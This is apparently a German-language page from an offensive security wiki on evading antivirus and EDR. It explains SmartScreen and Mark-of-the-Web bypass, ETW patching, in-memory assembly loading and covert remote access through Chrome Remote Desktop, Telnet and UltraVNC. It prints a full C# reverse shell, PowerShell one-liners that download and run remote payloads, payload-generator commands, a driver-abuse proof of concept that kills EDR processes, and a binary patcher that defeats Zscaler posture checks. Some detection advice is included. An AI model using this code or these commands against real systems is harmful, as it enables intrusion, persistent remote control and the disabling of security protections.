1.  Entfernung des Anti-Tampering – ConfuserEx verschlüsselt jeden *method body* und entschlüsselt ihn im statischen *module*-Konstruktor (`<Module>.cctor`). Außerdem wird die PE-Prüfsumme gepatcht, sodass jede Änderung zum Absturz der Binary führt. Verwenden Sie **AntiTamperKiller**, um die verschlüsselten Metadata-Tabellen zu finden, die XOR-Schlüssel wiederherzustellen und eine bereinigte Assembly zu schreiben:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Die Ausgabe enthält die 6 Anti-Tamper-Parameter (`key0-key3`, `nameHash`, `internKey`), die beim Erstellen Ihres eigenen Unpackers nützlich sein können.

2.  Wiederherstellung von Symbolen und Control Flow – übergeben Sie die *bereinigte* Datei an **de4dot-cex** (einen ConfuserEx-kompatiblen Fork von de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – wählt das ConfuserEx 2-Profil aus
• de4dot macht Control-Flow-Flattening rückgängig, stellt ursprüngliche Namespaces, Klassen und Variablennamen wieder her und entschlüsselt konstante Strings.

3.  Entfernen von Proxy-Calls – ConfuserEx ersetzt direkte Methodenaufrufe durch einfache Wrapper (auch *proxy calls* genannt), um die Dekompilierung weiter zu erschweren. Entfernen Sie sie mit **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nach diesem Schritt sollten normale .NET-APIs wie `Convert.FromBase64String` oder `AES.Create()` anstelle undurchsichtiger Wrapper-Funktionen (`Class8.smethod_10`, …) sichtbar sein.

4.  Manuelle Bereinigung – führen Sie die resultierende Binary unter dnSpy aus und suchen Sie nach großen Base64-Blobs oder der Verwendung von `RijndaelManaged`/`TripleDESCryptoServiceProvider`, um die *eigentliche* Payload zu finden. Häufig speichert die Malware sie als ein TLV-codiertes Byte-Array, das innerhalb von `<Module>.byte_0` initialisiert wird.

Die obige Kette stellt den Ausführungsfluss wieder her, **ohne das schädliche Sample ausführen zu müssen** – nützlich bei der Arbeit auf einer Offline-Workstation.

> 🛈  ConfuserEx erzeugt ein benutzerdefiniertes Attribut namens `ConfusedByAttribute`, das als IOC verwendet werden kann, um Samples automatisch zu triagieren.

#### Einzeiler
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ziel dieses Projekts ist es, einen Open-Source-Fork der [LLVM](http://www.llvm.org/)-Kompilierungssuite bereitzustellen, der durch [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) und Manipulationsschutz eine erhöhte Softwaresicherheit ermöglicht.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstriert, wie die Sprache `C++11/14` verwendet werden kann, um zur Compile-Zeit obfuskierten Code zu erzeugen, ohne externe Tools zu verwenden oder den Compiler zu verändern.
- [**obfy**](https://github.com/fritzone/obfy): Fügt eine Ebene obfuskierter Operationen hinzu, die vom C++-Template-Metaprogramming-Framework erzeugt werden und der Person, die die Anwendung knacken möchte, das Leben etwas schwerer machen.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64-Binary-obfuscator, der verschiedene PE-Dateien obfuskieren kann, darunter: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ist eine einfache Engine für metamorphic code für beliebige ausführbare Dateien.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein feingranulares Code-obfuscation-Framework für von LLVM unterstützte Sprachen, das ROP (return-oriented programming) verwendet. ROPfuscator obfuskiert ein Programm auf Assembly-Code-Ebene, indem reguläre Instruktionen in ROP-Ketten umgewandelt werden, wodurch unser natürliches Verständnis eines normalen Kontrollflusses vereitelt wird.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein in Nim geschriebener .NET-PE-Crypter
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kann vorhandene EXE/DLL-Dateien in shellcode umwandeln und anschließend laden.

## SmartScreen & MoTW

Möglicherweise ist dir dieser Bildschirm schon begegnet, wenn du einige ausführbare Dateien aus dem Internet heruntergeladen und ausgeführt hast.

Microsoft Defender SmartScreen ist ein Sicherheitsmechanismus, der den Endbenutzer davor schützen soll, potenziell schädliche Anwendungen auszuführen.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen arbeitet hauptsächlich mit einem reputationsbasierten Ansatz. Das bedeutet, dass das Herunterladen ungewöhnlicher Anwendungen SmartScreen auslöst und dadurch den Endbenutzer warnt und ihn daran hindert, die Datei auszuführen (die Datei kann jedoch weiterhin ausgeführt werden, indem man auf More Info -> Run anyway klickt).

**MoTW** (Mark of The Web) ist ein [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) mit dem Namen Zone.Identifier, der beim Herunterladen von Dateien aus dem Internet automatisch erstellt wird und zusammen mit der URL gespeichert wird, von der die Datei heruntergeladen wurde.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Überprüfen des Zone.Identifier ADS für eine aus dem Internet heruntergeladene Datei.</p></figcaption></figure>

> [!TIP]
> Es ist wichtig zu beachten, dass ausführbare Dateien, die mit einem **vertrauenswürdigen** Signaturzertifikat signiert wurden, **SmartScreen nicht auslösen**.

Eine sehr effektive Möglichkeit, zu verhindern, dass deine Payloads mit dem Mark of The Web versehen werden, besteht darin, sie in eine Art Container wie eine ISO-Datei zu verpacken. Das liegt daran, dass Mark-of-the-Web (MOTW) **nicht** auf **Nicht-NTFS**-Volumes angewendet werden kann.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ist ein Tool, das Payloads in Ausgabe-Container verpackt, um Mark-of-the-Web zu umgehen.

Beispielverwendung:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hier ist eine Demo zum Umgehen von SmartScreen, indem Payloads mithilfe von [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) in ISO-Dateien verpackt werden.

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ist ein leistungsstarker Logging-Mechanismus in Windows, der es Anwendungen und Systemkomponenten ermöglicht, **Ereignisse zu protokollieren**. Er kann jedoch auch von Security-Produkten verwendet werden, um bösartige Aktivitäten zu überwachen und zu erkennen.

Ähnlich wie AMSI deaktiviert (umgangen) wird, ist es auch möglich, die Funktion **`EtwEventWrite`** des User-Space-Prozesses sofort zurückkehren zu lassen, ohne Ereignisse zu protokollieren. Dazu wird die Funktion im Speicher gepatcht, sodass sie sofort zurückkehrt, wodurch das ETW-Logging für diesen Prozess effektiv deaktiviert wird.

Weitere Informationen findest du unter **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) und [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Das Laden von C#-Binaries im Speicher ist seit geraumer Zeit bekannt und weiterhin eine sehr gute Möglichkeit, deine Post-Exploitation-Tools auszuführen, ohne von AV erkannt zu werden.

Da die Payload direkt in den Speicher geladen wird, ohne den Datenträger zu berühren, müssen wir uns nur um das Patchen von AMSI für den gesamten Prozess kümmern.

Die meisten C2-Frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc usw.) bieten bereits die Möglichkeit, C#-Assemblies direkt im Speicher auszuführen. Dafür gibt es jedoch verschiedene Ansätze:

- **Fork\&Run**

Dabei wird **ein neuer sacrificial process gestartet**, dein bösartiger Post-Exploitation-Code in diesen neuen Prozess injiziert, der bösartige Code ausgeführt und der neue Prozess nach Abschluss beendet. Dies hat sowohl Vorteile als auch Nachteile. Der Vorteil der Fork-and-Run-Methode besteht darin, dass die Ausführung **außerhalb unseres Beacon-Implant-Prozesses** stattfindet. Das bedeutet, dass die **Wahrscheinlichkeit, dass unser **Implant überlebt**, wesentlich größer ist**, falls bei unserer Post-Exploitation-Aktion etwas schiefgeht oder sie erkannt wird. Der Nachteil besteht darin, dass die Wahrscheinlichkeit steigt, von **Behavioural Detections** erkannt zu werden.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dabei wird der bösartige Post-Exploitation-Code **in den eigenen Prozess** injiziert. Auf diese Weise musst du keinen neuen Prozess erstellen und von AV scannen lassen. Der Nachteil ist jedoch, dass bei einem Fehler während der Ausführung deiner Payload die **Wahrscheinlichkeit, deinen Beacon zu verlieren**, wesentlich größer ist, da er abstürzen könnte.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Wenn du mehr über das Laden von C#-Assemblies lesen möchtest, sieh dir diesen Artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) und deren InlineExecute-Assembly BOF an ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)).

Du kannst C#-Assemblies auch **aus PowerShell** laden. Sieh dir [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und [das Video von S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk) an.

## Andere Programmiersprachen verwenden

Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, ist es möglich, bösartigen Code mit anderen Sprachen auszuführen, indem man dem kompromittierten Rechner Zugriff **auf die Interpreter-Umgebung gewährt, die auf dem vom Angreifer kontrollierten SMB share installiert ist**.

Indem du Zugriff auf die Interpreter-Binaries und die Umgebung auf dem SMB share gewährst, kannst du **beliebigen Code in diesen Sprachen im Speicher** des kompromittierten Rechners ausführen.

Das Repository weist darauf hin: Defender scannt die Scripts weiterhin, aber durch die Verwendung von Go, Java, PHP usw. haben wir **mehr Flexibilität beim Umgehen statischer Signaturen**. Tests mit zufälligen, nicht obfuskierten Reverse-Shell-Scripts in diesen Sprachen waren erfolgreich.

## TokenStomping

Token stomping manipuliert das Access Token eines Security-Produkts wie EDR oder AV. Das Reduzieren der Berechtigungen des Tokens kann den Prozess weiterlaufen lassen und gleichzeitig verhindern, dass er privilegierte Inspektions- oder Remediation-Aktionen ausführt.

Um dies zu verhindern, könnte Windows **externen Prozessen den Zugriff auf Handles der Tokens von Security-Prozessen** verweigern.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Vertrauenswürdige Software verwenden

### Chrome Remote Desktop

Wie in [**diesem Blogbeitrag**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) beschrieben, ist es einfach, Chrome Remote Desktop auf dem PC eines Opfers zu installieren, anschließend die Kontrolle darüber zu übernehmen und Persistenz einzurichten:<sup>[[35]](#references)</sup>
1. Lade es von https://remotedesktop.google.com/ herunter, klicke auf „Set up via SSH“ und anschließend auf die MSI-Datei für Windows, um die MSI-Datei herunterzuladen.
2. Führe den Installer beim Opfer still aus (Administratorrechte erforderlich): `msiexec /i chromeremotedesktophost.msi /qn`
3. Kehre zur Chrome-Remote-Desktop-Seite zurück und klicke auf „Next“. Der Assistent fordert dich anschließend zur Autorisierung auf. Klicke auf die Schaltfläche „Authorize“, um fortzufahren.
4. Führe den bereitgestellten Befehl mit den erforderlichen Anpassungen aus: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (der Parameter `--pin` legt die PIN fest, ohne die GUI zu verwenden).


## Advanced Evasion

Evasion ist ein sehr komplexes Thema. Manchmal musst du in einem einzigen System viele verschiedene Telemetriequellen berücksichtigen, weshalb es in ausgereiften Umgebungen praktisch unmöglich ist, vollständig unentdeckt zu bleiben.

Jede Umgebung, gegen die du vorgehst, hat ihre eigenen Stärken und Schwächen.

Ich empfehle dringend, dir diesen Vortrag von [@ATTL4S](https://twitter.com/DaniLJ94) anzusehen, um einen Einstieg in fortgeschrittene Evasion-Techniken zu erhalten.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dies ist außerdem ein weiterer großartiger Vortrag von [@mariuszbit](https://twitter.com/mariuszbit) über Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Alte Techniken**

### **Prüfen, welche Teile Defender als bösartig erkennt**

Du kannst [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden. Dabei werden **Teile der Binary entfernt**, bis **festgestellt wird, welcher Teil von Defender** als bösartig erkannt wird, und dieser wird dir angezeigt.\
Ein weiteres Tool, das **dasselbe erledigt, ist** [**avred**](https://github.com/dobin/avred). Es bietet den Service offen im Web unter [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) an.

### **Telnet Server**

Bis Windows 10 enthielt jedes Windows einen **Telnet Server**, den du als Administrator installieren konntest mit:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Lass es beim Systemstart **starten** und führe es jetzt aus:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Telnet-Port ändern** (stealth) **und Firewall deaktivieren:**
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Lade es von [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) herunter (du benötigst die bin downloads, nicht das setup).

**AUF DEM HOST**: Führe _**winvnc.exe**_ aus und konfiguriere den Server:

- Aktiviere die Option _Disable TrayIcon_
- Lege unter _VNC Password_ ein Passwort fest
- Lege unter _View-Only Password_ ein Passwort fest

Verschiebe anschließend die Binary _**winvnc.exe**_ und die **neu** erstellte Datei _**UltraVNC.ini**_ in den **victim**

#### **Reverse connection**

Der **attacker** sollte auf seinem **host** die Binary `vncviewer.exe -listen 5900` **ausführen**, damit sie darauf **vorbereitet** ist, eine Reverse-**VNC connection** zu empfangen. Führe anschließend auf dem **victim** den winvnc daemon mit `winvnc.exe -run` aus und führe `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` aus.

**WARNUNG:** Um stealth zu wahren, darfst du einige Dinge nicht tun:

- Starte `winvnc` nicht, wenn es bereits läuft, da dadurch ein [popup](https://i.imgur.com/1SROTTl.png) ausgelöst wird. Prüfe mit `tasklist | findstr winvnc`, ob es läuft.
- Starte `winvnc` nicht ohne `UltraVNC.ini` im selben Verzeichnis, da dadurch [the config window](https://i.imgur.com/rfMQWcf.png) geöffnet wird.
- Führe `winvnc -h` nicht zur Hilfe aus, da dadurch ein [popup](https://i.imgur.com/oc18wcu.png) ausgelöst wird.

### GreatSCT

Lade es von [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT) herunter.
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
In GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Starte nun den **lister** mit `msfconsole -r file.rc` und **führe** das **xml payload** mit Folgendem aus:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Der aktuelle Defender wird den Prozess sehr schnell beenden.**

### Kompilieren unseres eigenen reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erste C# Revershell

Kompiliere es mit:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Verwende es mit:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# mit Compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatischer Download und Ausführung:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste der C#-Obfuscatoren: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Python zum Erstellen von Injectors verwenden – Beispiel:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Weitere Tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Mehr

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR aus dem Kernel-Space beenden

Storm-2603 nutzte ein kleines Konsolenprogramm namens **Antivirus Terminator**, um den Endpunktschutz zu deaktivieren, bevor Ransomware abgelegt wurde. Das Tool bringt seinen **eigenen verwundbaren, aber *signierten* Treiber** mit und missbraucht ihn, um privilegierte Kernel-Operationen auszuführen, die selbst Protected-Process-Light-(PPL)-AV-Dienste nicht blockieren können.<sup>[[12]](#references)</sup>

Wichtige Erkenntnisse
1. **Signierter Treiber**: Die auf die Festplatte gelieferte Datei heißt `ServiceMouse.sys`, aber das Binary ist tatsächlich der legitim signierte Treiber `AToolsKrnl64.sys` aus Antiy Labs’ „System In-Depth Analysis Toolkit“. Da der Treiber eine gültige Microsoft-Signatur trägt, wird er auch bei aktiviertem Driver-Signature-Enforcement (DSE) geladen.
2. **Installation des Service**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die erste Zeile registriert den Treiber als **Kernel-Service**, und die zweite startet ihn, sodass `\\.\ServiceMouse` aus dem Userland zugänglich wird.
3. **Vom Treiber bereitgestellte IOCTLs**
| IOCTL code | Fähigkeit                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Beliebigen Prozess per PID beenden (zum Beenden von Defender-/EDR-Services verwendet) |
| `0x990000D0` | Beliebige Datei auf der Festplatte löschen |
| `0x990001D0` | Treiber entladen und den Service entfernen |

Minimales C-Proof-of-Concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Warum es funktioniert**:  BYOVD umgeht den User-Mode-Schutz vollständig; im Kernel ausgeführter Code kann *geschützte* Prozesse öffnen, beenden oder Kernel-Objekte manipulieren – unabhängig von PPL/PP, ELAM oder anderen Hardening-Funktionen.

Erkennung / Gegenmaßnahmen
•  Aktivieren Sie Microsofts Blockierliste für verwundbare Treiber (`HVCI`, `Smart App Control`), damit Windows das Laden von `AToolsKrnl64.sys` verweigert.
•  Überwachen Sie die Erstellung neuer *Kernel*-Services und lösen Sie einen Alarm aus, wenn ein Treiber aus einem für alle Benutzer beschreibbaren Verzeichnis geladen wird oder nicht auf der Allow-List vorhanden ist.
•  Achten Sie auf User-Mode-Handles zu benutzerdefinierten Geräteobjekten, auf die verdächtige `DeviceIoControl`-Aufrufe folgen.

### Umgehen der Zscaler Client Connector Posture Checks durch Patching von Binaries auf der Festplatte

Zscalers **Client Connector** wendet Device-Posture-Regeln lokal an und nutzt Windows RPC, um die Ergebnisse an andere Komponenten zu übermitteln. Zwei schwache Designentscheidungen ermöglichen einen vollständigen Bypass:

1. Die Posture-Evaluierung findet **vollständig clientseitig** statt (ein Boolean wird an den Server gesendet).
2. Interne RPC-Endpunkte prüfen lediglich, ob das verbindende Executable **von Zscaler signiert** ist (über `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Durch das **Patchen von vier signierten Binaries auf der Festplatte** können beide Mechanismen neutralisiert werden:

| Binary | Gepatchte ursprüngliche Logik | Ergebnis |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gibt immer `1` zurück, sodass jede Prüfung als konform gilt |
| `ZSAService.exe` | Indirekter Aufruf von `WinVerifyTrust` | NOP-ed ⇒ Jeder Prozess, auch ein unsignierter, kann sich an die RPC-Pipes binden |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Durch `mov eax,1 ; ret` ersetzt |
| `ZSATunnel.exe` | Integritätsprüfungen des Tunnels | Kurzgeschlossen |

Minimaler Auszug des Patchers:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nach dem Ersetzen der ursprünglichen Dateien und dem Neustart des Service-Stacks:

* **Alle** Posture-Checks werden als **grün/konform** angezeigt.
* Nicht signierte oder veränderte Binaries können die benannten Named-Pipe-RPC-Endpunkte öffnen (z. B. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Der kompromittierte Host erhält uneingeschränkten Zugriff auf das interne Netzwerk, das durch die Zscaler-Richtlinien definiert wird.

Diese Fallstudie zeigt, wie sich rein clientseitige Trust-Entscheidungen und einfache Signaturprüfungen mit wenigen Byte-Patches umgehen lassen.

## Missbrauch vertrauenswürdiger Funktionalität von Microsoft Defenders `BTR.sys`

Der **Boot-Time Removal**-Treiber von Defender ist ein nützliches Gegenbeispiel zu klassischem BYOVD. `BTR.sys` ist eine legitime, von Microsoft signierte Remediation-Komponente ohne Memory-Corruption-Bug und ohne IOCTL-Schnittstelle; nach Erlangung von Administratorzugriff und `SeLoadDriverPrivilege` kann ein Operator stattdessen seine private Remediation-Transaktion fälschen und die vorgesehenen Ring-0-Datei-/Registry-Operationen ausführen. Dies ist ein **Post-Compromise-Primitive zur Neutralisierung von AV/EDR und kein Initial Access oder Privilege Escalation**. Außerdem kann der Treiber aus der `BOOTTIMETOOL`-Ressource der eigenen `MpEngine.dll` des Ziels extrahiert werden, anstatt einen auffälligen Third-Party-Treiber zu importieren.<sup>[[36]](#references)</sup>

### Staging des One-Shot-Treibers

Defender legt die Ressource normalerweise als Datei mit zufälligem Namen `[a-z]{8}.sys` ab und registriert einen ähnlich benannten Kernel-Service. `DriverEntry` liest den `Args`-Wert des Service, öffnet den referenzierten NTFS ADS, entschlüsselt und validiert die Aktionsliste, schreibt Feedback und gibt nach erfolgreicher Ausführung `0xC0000056` (`STATUS_DELETE_PENDING`) zurück, damit der Treiber entladen wird, anstatt resident zu bleiben. Ein gefälschter Service weist die folgenden charakteristischen Werte auf.<sup>[[36]](#references)[[37]](#references)</sup>
```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```
